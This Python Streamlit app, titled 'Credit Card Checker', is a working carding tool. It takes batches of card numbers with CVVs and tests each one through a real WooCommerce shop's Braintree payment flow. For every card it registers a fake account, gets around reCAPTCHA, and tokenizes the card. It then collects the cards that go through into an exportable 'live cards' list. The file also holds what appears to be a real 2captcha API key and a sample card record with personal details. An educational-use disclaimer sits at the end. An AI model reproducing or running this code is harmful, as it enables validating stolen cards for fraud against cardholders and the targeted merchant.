import os
import streamlit as st
try:
    import pyfiglet, webbrowser, user_agent, time
    import requests
    import re
    import base64
    import random
    import string
    
except ImportError as e:
    print("An error occurred in installing library:", e)
    print("Libraries are installed.")
    os.system('pip install pyfiglet user_agent requests')
    import pyfiglet
    import webbrowser
    import user_agent
    import time
    import requests
    import re
    import base64
    import random
    import string
    import requests


# Function to get reCAPTCHA token
def get_recaptcha_token(site_key, page_url):
    st.info("Attempting to solve reCAPTCHA...")
    
    # Option 1: Use 2captcha service (recommended for production)
    # Uncomment and add your API key if you use 2captcha
    """
    try:
        api_key = "9f21f1ce48c5ab80f2f9b423fefb1682"  # Replace with your actual 2captcha API key
        data = {
            'key': api_key,
            'method': 'userrecaptcha',
            'googlekey': site_key,
            'pageurl': page_url,
            'json': 1
        }
        
        # Step 1: Send the captcha to 2captcha
        response = requests.post('https://2captcha.com/in.php', data=data)
        response_json = response.json()
        
        if response_json['status'] == 1:
            request_id = response_json['request']
            
            # Step 2: Wait and get the result
            for _ in range(30):  # Try for 30 times with 5-second delays
                time.sleep(5)
                response = requests.get(f'https://2captcha.com/res.php?key={api_key}&action=get&id={request_id}&json=1')
                response_json = response.json()
                
                if response_json['status'] == 1:
                    return response_json['request']
                
                if response_json['request'] != 'CAPCHA_NOT_READY':
                    break
            
            st.error(f"Failed to solve captcha: {response_json['request']}")
        else:
            st.error(f"Failed to send captcha: {response_json['request']}")
    except Exception as e:
        st.error(f"Error using 2captcha: {str(e)}")
    """
    
    # Option 2: For testing purposes, use a mock token or manual input
    # This is a simplified approach for demonstration
    
    # Mock token (for testing only, will not work in production!)
    mock_token = "03AFcWeA7KujBjqTwe4XyY6DmEAe2fa-DkTbKCTCN-clEW52H2Fit-itsPZsee6Lruva1ZAp4sghrgISu77DOR8eG-SkLUssHXF8cY0b6bHWE6A0_VBmoS7qaBLKxXdQttJ18NfN4JljADlktXtYE3VSB6JtOCTilLP_OnminvDcjAv0eo4CPaiRCcVszsIBQHZGG0ph3gYBvbe5WtrDYPvocCXaP73J-T9oKCrJ3jia7Mkry_YWXQB7SLGK7u9u4Iu6GM70l9sxLG9NNgu-rNNodTwzZ746krG26MPcvaVUPqwzB5qAU3Son7Dd5O5xTypLl4SiW6Ku0WZ7DcOPPGHMOFAgJwY4A-evdUOhQY23ABzQuD6E4ggM5KDNpzcCWFYbE7"
    
    # For real usage, you should either:
    # 1. Use a captcha solving service like 2captcha, anticaptcha, etc.
    # 2. Allow manual input of the token:
    
    # Option for manual input by the user
    manual_token = st.text_area(
        "Enter reCAPTCHA token manually",
        help="You can get this token by opening the network tab in developer tools, completing the captcha, and copying the value of 'g-recaptcha-response' or similar field",
        value=mock_token
    )
    
    if st.button("Use this token"):
        if manual_token:
            return manual_token
        else:
            st.warning("Please enter a token")
    
    return mock_token  # Remove this in production, use only the manual input or captcha service


def Tele(ccx, recaptcha_token=None):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:
        yy = yy.split("20")[1]
        
    user = user_agent.generate_user_agent()
        
    r = requests.session()
    
    r.follow_redirects = True
    
    r.verify = False

    def generate_full_name():
        first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
                       "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
                       "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
                       "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha",
                       "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
                       "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
                       "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia",
                       "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
                       "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
                       "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"]
        
        last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
                       "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
                       "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
                       "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera",
                       "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
                       "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
                       "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
                       "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"]
        
        full_name = random.choice(first_names) + " " + random.choice(last_names)
        first_name, last_name = full_name.split()

        return first_name, last_name
    
    def generate_address():
        cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
        states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
        streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
        zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]

        city = random.choice(cities)
        state = states[cities.index(city)]
        street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
        zip_code = zip_codes[states.index(state)]

        return city, state, street_address, zip_code
    
    # Testing the library:
    first_name, last_name = generate_full_name()
    city, state, street_address, zip_code = generate_address()
    
    def generate_random_account(length=12):
        name = ''.join(random.choices(string.ascii_lowercase, k=20))
        number = ''.join(random.choices(string.digits, k=4))
        return f"{name}{number}@gmail.com"

    def generate_password(length=12):
        name = ''.join(random.choices(string.ascii_lowercase, k=13))
        number = ''.join(random.choices(string.digits, k=4))
        return f"{name}{number}"
    password = generate_password()
    acc = generate_random_account()
    
    def username():
        name = ''.join(random.choices(string.ascii_lowercase, k=20))
        number = ''.join(random.choices(string.digits, k=20))
                
        return f"{name}{number}"
    username = (username())
    
    def num():
        number = ''.join(random.choices(string.digits, k=8))
        return f"014{number}"
    num = (num())
    
    def generate_random_code(length=32):
        letters_and_digits = string.ascii_letters + string.digits
        return ''.join(random.choice(letters_and_digits) for _ in range(length))
    corr = generate_random_code()

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'user-agent': user,
    }
    
    with st.spinner("Checking card... register phase"):
        response = r.get('https://www.yazoomills.com/my-account', headers=headers)
        
        try:
            register_nonce = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
        except:
            return "Error: Could not extract register nonce"
    
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'pragma': 'no-cache',
        'user-agent': user,
    }
    

    # Get current timestamp for session
    current_time = time.strftime('%Y-%m-%d %H:%M:%S')
    
    data = {
    'username': username,
    'email': acc,
    'password': password,
    'wc_order_attribution_source_type': '',
    'wc_order_attribution_referrer': '(none)',
    'wc_order_attribution_utm_campaign': '(none)',
    'wc_order_attribution_utm_source': '(direct)',
    'wc_order_attribution_utm_medium': '(none)',
    'wc_order_attribution_utm_content': '(none)',
    'wc_order_attribution_utm_id': '(none)',
    'wc_order_attribution_utm_term': '(none)',
    'wc_order_attribution_utm_source_platform': '(none)',
    'wc_order_attribution_utm_creative_format': '(none)',
    'wc_order_attribution_utm_marketing_tactic': '(none)',
    'wc_order_attribution_session_entry': 'https://www.yazoomills.com/my-account/',
    'wc_order_attribution_session_start_time': current_time,
    'wc_order_attribution_session_pages': 6,
    'wc_order_attribution_session_count': 1,
    'wc_order_attribution_user_agent': user,
    'woocommerce-register-nonce': register_nonce,
    'i13_recaptcha_register_token': recaptcha_token or '',  # Use provided token or empty string
    '_wp_http_referer': '/my-account/',
    'register': 'Register',
    }
    
    with st.spinner("Checking card... REgister"):
        response = r.post('https://www.yazoomills.com/my-account/', headers=headers, data=data)
    
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'user-agent': user,
    }
    
    # Billing address section commented out as requested
    # with st.spinner("Checking card... Setting up address"):
    #     response = r.get('https://www.yazoomills.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers)
    #     
    #     try:
    #         address = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', response.text).group(1)
    #     except:
    #         return "Error: Could not extract address nonce"
    # 
    # headers = {
    #     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    #     'cache-control': 'no-cache',
    #     'content-type': 'application/x-www-form-urlencoded',
    #     'pragma': 'no-cache',
    #     'user-agent': user,
    # }
    # 
    # data = {
    #     'billing_first_name': first_name,
    #     'billing_last_name': last_name,
    #     'billing_company': '',
    #     'billing_country': 'GB',
    #     'billing_address_1': street_address,
    #     'billing_address_2': '',
    #     'billing_city': 'Logan',
    #     'billing_state': '',
    #     'billing_postcode': 'BT1 1AA',
    #     'billing_phone': num,
    #     'billing_email': acc,
    #     'save_address': 'Save address',
    #     'woocommerce-edit-address-nonce': address,
    #     '_wp_http_referer': '/my-account/edit-address/billing/',
    #     'action': 'edit_address'
    # }
    # 
    # with st.spinner("Checking card... Setting billing address"):
    #     response = r.post('https://www.yazoomills.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers, data=data)
    
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'user-agent': user,
    }
    
    with st.spinner("Checking card... Preparing payment method"):
        response = r.get('https://www.yazoomills.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
        
        try:
            add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
        except:
            return "Error: Could not extract payment method nonce"
        
        try:
            client = re.search(r'client_token_nonce":"([^"]+)"', response.text).group(1)
        except:
            return "Error: Could not extract client token nonce"
    
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'pragma': 'no-cache',
        'user-agent': user,
    }
        
    data = {
        'action': 'wc_braintree_credit_card_get_client_token',
        'nonce': client,
    }
        
    with st.spinner("Checking card... Getting client token"):
        response = r.post('https://www.yazoomills.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
        
        try:
            enc = response.json()['data']
        except:
            return "Error: Could not extract encoded data"
        
        try:
            dec = base64.b64decode(enc).decode('utf-8')
        except:
            return "Error: Could not decode base64 data"
        
        try:
            au = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
        except:
            return "Error: Could not extract authorization fingerprint"
    
    headers = {
        'authority': 'payments.braintree-api.com',
        'accept': '*/*',
        'authorization': f'Bearer {au}',
        'braintree-version': '2018-05-10',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'pragma': 'no-cache',
        'user-agent': user,
    }
        
    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': '9c8cc072-4588-4af4-b73e-a4f0d2af84e4',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': n,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv': cvc,
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }
        
    with st.spinner("Checking card... Tokenizing card"):
        response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
            
        try:
            tok = response.json()['data']['tokenizeCreditCard']['token']
            type = response.json()["data"]["tokenizeCreditCard"]["creditCard"]["brandCode"]
        except:
            return "Error: Card tokenization failed. Invalid card details."
    
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'pragma': 'no-cache',
        'user-agent': user,
    }
        
    data = {
        'payment_method': 'braintree_credit_card',
        'wc-braintree-credit-card-card-type': type,
        'wc-braintree-credit-card-3d-secure-enabled': '',
        'wc-braintree-credit-card-3d-secure-verified': '',
        'wc-braintree-credit-card-3d-secure-order-total': '0.00',
        'wc_braintree_credit_card_payment_nonce': tok,
        'wc_braintree_device_data': '{"correlation_id":"'+corr+'"}',
        'wc-braintree-credit-card-tokenize-payment-method': 'true',
        'woocommerce-add-payment-method-nonce': add_nonce,
        '_wp_http_referer': '/my-account/add-payment-method/',
        'woocommerce_add_payment_method': '1',
    }

   
    with st.spinner("Checking card... Finalizing check"):
        response = r.post('https://www.yazoomills.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
                
        text = response.text
            
        pattern = r'Status code (.*?)\s*</li>'
            
        match = re.search(pattern, text)
        if match:
            result = match.group(1)
            if 'risk_threshold' in text:
                result = "RISK: Retry this BIN later."
        else:
            if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
                result = "1000: Approved"
            else:
                result = "Error"
        
        # Return both the status, actual message, and account details
        is_approved = False
        
        if 'funds' in result or 'added' in result or 'FUNDS' in result or 'CHARGED' in result or 'Funds' in result or 'avs' in result or 'postal' in result or 'approved' in result or 'Nice!' in result or 'Approved' in result or 'cvv: Gateway Rejected: cvv' in result or 'does not support this type of purchase.' in result or 'Duplicate' in result or 'Successful' in result or 'Authentication Required' in result or 'successful' in result or 'Thank you' in result or 'confirmed' in result or 'successfully' in result or 'INVALID_BILLING_ADDRESS' in result:
            is_approved = True
        
        # Get the full response from the page for better diagnostics
        full_response_line = ""
        if match:
            full_response_line = match.group(0)
        elif 'Nice! New payment method added' in text:
            full_response_line = "Nice! New payment method added"
        elif 'Payment method successfully added.' in text:
            full_response_line = "Payment method successfully added."
        
        # Extract additional error or status information from the response page
        additional_info = ""
        error_pattern = r'<li class="woocommerce-error">(.*?)</li>'
        success_pattern = r'<div class="woocommerce-message"[^>]*>(.*?)</div>'
        
        error_matches = re.findall(error_pattern, text)
        if error_matches:
            additional_info = " | ".join(error_matches)
        else:
            success_matches = re.findall(success_pattern, text)
            if success_matches:
                additional_info = " | ".join(success_matches)
                
        if additional_info:
            full_response_line += f" | {additional_info}"
        
        # Include username/email and password in the result
        return {
            'status': 'Approved' if is_approved else 'Declined', 
            'message': result,
            'full_response': full_response_line,
            'username': username,
            'email': acc,
            'password': password
        }

def sq(card):
    return 'Your card was declined.'

# Set up the page configuration
st.set_page_config(
    page_title="Credit Card Checker",
    page_icon="💳",
    layout="wide"
)

# Add a sidebar for settings
with st.sidebar:
    st.header("Settings")
    # reCAPTCHA configuration
    st.subheader("reCAPTCHA Settings")
    recaptcha_site_key = st.text_input(
        "reCAPTCHA Site Key", 
        value="6Lfq2mgqAAAAAMxwxeXtYDFWJGVyjNEZXGMwb375",
        help="The site key is usually found in the HTML source of the page or in the network requests"
    )
    
    # Option to enable/disable reCAPTCHA solution
    enable_recaptcha = st.checkbox("Enable reCAPTCHA Solution", value=True)
    
    if enable_recaptcha:
        st.info("""
        To get a token manually:
        1. Open browser dev tools (F12)
        2. Go to Network tab
        3. Complete the reCAPTCHA on the site
        4. Look for requests with 'recaptcha' in the name
        5. Find the g-recaptcha-response value in form data
        """)

# Add some CSS for styling
st.markdown("""
<style>
    .main {
        background-color: #f5f5f5;
    }
    .stButton button {
        background-color: #4CAF50;
        color: white;
        font-weight: bold;
        border-radius: 5px;
        padding: 10px 24px;
        margin: 10px 0;
    }
    .result-success {
        background-color: #dff0d8;
        color: #3c763d;
        padding: 15px;
        border-radius: 4px;
        border-left: 6px solid #3c763d;
        margin: 10px 0;
    }
    .result-error {
        background-color: #f2dede;
        color: #a94442;
        padding: 15px;
        border-radius: 4px;
        border-left: 6px solid #a94442;
        margin: 10px 0;
    }
    .result-loading {
        background-color: #d9edf7;
        color: #31708f;
        padding: 15px;
        border-radius: 4px;
        border-left: 6px solid #31708f;
        margin: 10px 0;
    }
    .title {
        color: #333;
        text-align: center;
        padding: 20px 0;
    }
    .card-form {
        background-color: white;
        padding: 20px;
        border-radius: 10px;
        box-shadow: 0 4px 8px rgba(0,0,0,0.1);
        margin: 20px 0;
    }
    .footer {
        text-align: center;
        margin-top: 50px;
        color: #777;
    }
</style>
""", unsafe_allow_html=True)

# Title and description
st.markdown("<h1 class='title'>💳 Credit Card Checker</h1>", unsafe_allow_html=True)
st.markdown("<div style='text-align: center; margin-bottom: 30px;'>Check multiple credit cards through Braintree's payment system</div>", unsafe_allow_html=True)

# Credit card input form
st.markdown("<div class='card-form'>", unsafe_allow_html=True)

# Instructions
st.markdown("""
### Instructions
Paste your cards in the format below:
```
CARD_NUMBER|MONTH|YEAR|CVV|NAME|ADDRESS|CITY|STATE|ZIP|PHONE||COUNTRY
```

Example:
```
371068184737011|08|26|3108|Diana Jordan|6397 Donner Circle|PARKER|CO|80134|3033451970||UNITED STATES
```

Only the first 4 fields (card number, month, year, CVV) are required for checking.
""")

# Text area for multiple cards
cards_text = st.text_area("Paste Multiple Cards", 
                         height=150, 
                         placeholder="Paste cards here (one per line)")

st.markdown("</div>", unsafe_allow_html=True)

# Create a tab view for results
tab1, tab2 = st.tabs(["Results", "Live Cards"])

# Get reCAPTCHA token if enabled
recaptcha_token = None
if 'recaptcha_token' not in st.session_state:
    st.session_state.recaptcha_token = None

if enable_recaptcha and st.sidebar.button("Get reCAPTCHA Token"):
    with st.spinner("Getting reCAPTCHA token..."):
        recaptcha_token = get_recaptcha_token(
            recaptcha_site_key, 
            "https://www.yazoomills.com/my-account/"
        )
        st.session_state.recaptcha_token = recaptcha_token
        st.sidebar.success("Token obtained! You can now check cards.")

# Display current token if available
if st.session_state.recaptcha_token:
    st.sidebar.code(st.session_state.recaptcha_token[:50] + "...", language=None)
    if st.sidebar.button("Clear Token"):
        st.session_state.recaptcha_token = None
        st.experimental_rerun()

# Check button
if st.button("Check Cards", key="check_btn"):
    if not cards_text:
        st.error("Please paste card details in the text area.")
    else:
        # Split the input by lines
        card_lines = [line.strip() for line in cards_text.strip().split('\n') if line.strip()]
        
        if not card_lines:
            st.error("No valid card entries found.")
            st.stop()
        
        # Progress bar
        progress_bar = st.progress(0)
        
        # Prepare result containers
        results = []
        live_cards = []
        
        # Create placeholders for real-time results display
        with tab1:
            st.header("Results")
            results_container = st.container()
        
        with tab2:
            st.header("Live Cards")
            live_cards_container = st.container()
            live_cards_text_area = st.empty()
        
        # Status placeholders for each card
        status_containers = []
        result_containers = []
        for i in range(len(card_lines)):
            status_containers.append(st.empty())
            result_containers.append(results_container.empty())
        
        with st.spinner(f"Checking {len(card_lines)} cards..."):
            # Process each card
            for i, card_line in enumerate(card_lines):
                try:
                    # Update status before processing
                    status_containers[i].info(f"Processing card {i+1}/{len(card_lines)}")
                    
                    # Split the card data by pipe
                    card_parts = card_line.split("|")
                    
                    # Check if we have at least the required parts
                    if len(card_parts) < 4:
                        result = {
                            "card": card_line,
                            "status": "Error",
                            "message": "Invalid format. Need at least CARD|MONTH|YEAR|CVV"
                        }
                        results.append(result)
                        
                        # Show result immediately
                        result_containers[i].markdown(f"""
                        <div class='result-error'>
                            <h3>❌ Error: Invalid Format</h3>
                            <p>Message: {result["message"]}</p>
                            <p>Full: {result["card"]}</p>
                        </div>
                        """, unsafe_allow_html=True)
                        
                        status_containers[i].error("Invalid format")
                        progress_bar.progress((i + 1) / len(card_lines))
                        continue
                    
                    # Extract card details
                    card_number = card_parts[0].strip()
                    mm = card_parts[1].strip()
                    yy = card_parts[2].strip()
                    cvv = card_parts[3].strip()
                    
                    # Create the card data string for Tele function
                    card_data = f"{card_number}|{mm}|{yy}|{cvv}"
                    
                    # Update progress
                    status_containers[i].info(f"Checking card: {card_number[-4:]}")
                    progress_bar.progress((i + 1) / len(card_lines))
                    
                    # Process the card check with timeout to prevent hanging
                    max_retries = 2
                    for retry in range(max_retries):
                        try:
                            # Set a timeout for processing
                            result = Tele(card_data, st.session_state.recaptcha_token)
                            break
                        except Exception as retry_error:
                            if retry < max_retries - 1:
                                status_containers[i].warning(f"Retry {retry+1}/{max_retries}...")
                                time.sleep(1)  # Short delay before retry
                            else:
                                raise retry_error
                    
                    # Record the result (handle both dictionary and string formats)
                    if isinstance(result, dict):
                        # New format from our updated Tele function
                        status = result['status']
                        message = result['message']
                        # Extract additional info if available
                        email = result.get('email', '')
                        password = result.get('password', '')
                        username = result.get('username', '')
                        full_response = result.get('full_response', '')
                    else:
                        # For backward compatibility with string format
                        status = "Approved" if result == "Approved" else "Declined"
                        message = result if result != "Approved" else "Card is valid"
                        email = ""
                        password = ""
                        username = ""
                        full_response = ""
                    
                    card_result = {
                        "card": card_line,
                        "card_number": card_number,
                        "last4": card_number[-4:],
                        "status": status,
                        "message": message,
                        "email": email,
                        "password": password,
                        "username": username,
                        "full_response": full_response
                    }
                    
                    results.append(card_result)
                    
                    # Show result immediately in results tab
                    if status == "Approved":
                        # For approved cards, show account details
                        account_info = ""
                        if card_result.get("email") and card_result.get("password"):
                            account_info = f"""
                            <div style="background-color: #f8f9fa; padding: 10px; border-radius: 4px; margin: 10px 0;">
                                <h4>Account Details:</h4>
                                <p><strong>Email:</strong> {card_result["email"]}</p>
                                <p><strong>Password:</strong> {card_result["password"]}</p>
                                <p><strong>Username:</strong> {card_result.get("username", "N/A")}</p>
                            </div>
                            """
                        
                        # Full response info if available
                        response_info = ""
                        if card_result.get("full_response"):
                            response_info = f"""
                            <div style="background-color: #f0f0f0; padding: 10px; border-radius: 4px; margin-top: 10px;">
                                <p><strong>Full Response:</strong> {card_result["full_response"]}</p>
                            </div>
                            """
                        
                        result_containers[i].markdown(f"""
                        <div class='result-success'>
                            <h3>✅ Approved: Card ending in {card_result["last4"]}</h3>
                            <p><strong>Status:</strong> {card_result["message"]}</p>
                            <p><strong>Card:</strong> {card_result["card"]}</p>
                            {account_info}
                            {response_info}
                        </div>
                        """, unsafe_allow_html=True)
                        
                        live_cards.append(card_line)
                        status_containers[i].success(f"Approved: {card_number[-4:]}")
                        
                        # Update live cards display immediately
                        current_live_cards_text = "\n".join(live_cards)
                        live_cards_text_area.code(current_live_cards_text, language="")
                        live_cards_container.success(f"Found {len(live_cards)} live cards so far")
                    else:
                        # For declined cards, show account details and full response
                        account_info = ""
                        if card_result.get("email") and card_result.get("password"):
                            account_info = f"""
                            <div style="background-color: #f8f9fa; padding: 10px; border-radius: 4px; margin: 10px 0;">
                                <h4>Account Details:</h4>
                                <p><strong>Email:</strong> {card_result["email"]}</p>
                                <p><strong>Password:</strong> {card_result["password"]}</p>
                                <p><strong>Username:</strong> {card_result.get("username", "N/A")}</p>
                            </div>
                            """
                        
                        # Full response info if available
                        response_info = ""
                        if card_result.get("full_response"):
                            response_info = f"""
                            <div style="background-color: #f0f0f0; padding: 10px; border-radius: 4px; margin-top: 10px;">
                                <p><strong>Full Response:</strong> {card_result["full_response"]}</p>
                            </div>
                            """
                        
                        result_containers[i].markdown(f"""
                        <div class='result-error'>
                            <h3>❌ {card_result["status"]}: {card_result["card_number"]}</h3>
                            <p><strong>Message:</strong> {card_result["message"]}</p>
                            <p><strong>Card:</strong> {card_result["card"]}</p>
                            {account_info}
                            {response_info}
                        </div>
                        """, unsafe_allow_html=True)
                        
                        status_containers[i].error(f"Declined: {card_number[-4:]}")
                    
                except Exception as e:
                    error_msg = f"Processing error: {str(e)}"
                    card_result = {
                        "card": card_line,
                        "status": "Error",
                        "message": error_msg
                    }
                    results.append(card_result)
                    
                    # Show error immediately
                    result_containers[i].markdown(f"""
                    <div class='result-error'>
                        <h3>❌ Error: Processing Failed</h3>
                        <p>Message: {error_msg}</p>
                        <p>Full: {card_line}</p>
                    </div>
                    """, unsafe_allow_html=True)
                    
                    status_containers[i].error(f"Error processing card {i+1}")
        
        # Update final counts after all processing
        with tab1:
            # Replace the header with the final count
            st.header(f"Results ({len(results)} cards)")
        
        with tab2:
            # Replace the header with the final count
            st.header(f"Live Cards ({len(live_cards)} cards)")
            
            if live_cards:
                live_cards_text = "\n".join(live_cards)
                st.code(live_cards_text, language="")
                
                col1, col2 = st.columns(2)
                
                # Copy button
                with col1:
                    if st.button("Copy Live Cards"):
                        st.code(live_cards_text, language="")
                        st.success("Live cards copied to clipboard!")
                
                # Export to file button
                with col2:
                    if st.button("Export Live Cards"):
                        # Create a timestamp for the file name
                        timestamp = time.strftime("%Y%m%d_%H%M%S")
                        filename = f"live_cards_{timestamp}.txt"
                        
                        # Create a download link
                        st.download_button(
                            label="Download Live Cards File",
                            data=live_cards_text,
                            file_name=filename,
                            mime="text/plain"
                        )
                        
                        st.success(f"Live cards exported to {filename}")
            else:
                st.warning("No live cards found.")

# Add a disclaimer at the bottom
st.markdown("<div class='footer'>", unsafe_allow_html=True)
st.markdown("**Disclaimer:** This tool is for educational purposes only. Do not use with real credit cards or for any illegal activities.")
st.markdown("</div>", unsafe_allow_html=True)
